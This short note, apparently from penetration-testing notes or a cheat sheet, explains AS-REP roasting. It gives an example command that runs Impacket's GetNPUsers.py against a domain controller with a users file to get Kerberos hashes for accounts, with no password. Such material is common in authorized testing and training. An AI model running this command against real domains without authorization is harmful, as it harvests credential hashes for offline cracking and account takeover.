We are able to check if we can get kerb hashes for users via impackets `GetNPUsers` .

This will return kerberos hash for the users

Example Command 

`python3.9 /opt/impacket/examples/GetNPUsers.py <DOMAIN/> -dc-ip <IP> -no-pass -usersfile users.txt
`